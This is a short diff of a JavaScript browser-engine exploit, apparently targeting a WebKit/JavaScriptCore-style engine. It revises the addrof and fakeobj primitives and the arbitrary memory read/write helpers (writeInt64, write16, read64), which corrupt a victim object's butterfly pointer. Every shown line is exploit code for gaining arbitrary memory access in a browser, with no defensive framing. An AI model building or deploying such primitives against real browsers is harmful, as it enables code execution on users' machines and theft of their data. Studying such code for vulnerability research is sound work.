@@ -409,11 +409,11 @@ function iv(x){
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return Int64.fromDouble(a1[offset]);
+              return a1[offset];
             }
             fakeobj = (addr) => {
               a1[offset] = addr;
-              return new Int64(b1[0]).asDouble();
+              return b1[0];
             }
             port.postMessage("addrof and fakeobj done");
 var print = (msg) => {
@@ -468,14 +468,14 @@ var print = (msg) => {
 
         // Write an int64 to the given address.
         writeInt64(addr, int64) {
-            hax[1] = bigint2float(addr+0x10);
+            hax[1] = Add(new Int64(addr),0x10);
             victim.pointer = int64.asJSValue();
         },
 
         /*// Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
         write16(addr, value) {
             // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, 0x10).asDouble();
+            hax[1] = Add(new Int64(addr), 0x10).asDouble();
             victim.pointer = value;
         },
 
@@ -494,7 +494,7 @@ var print = (msg) => {
         // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
         read64(addr) {
             // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, 0x10).asDouble();
+            hax[1] = Add(new Int64(addr), 0x10).asDouble();
             return this.addrof(victim.pointer);
         },
         read16(addr) {
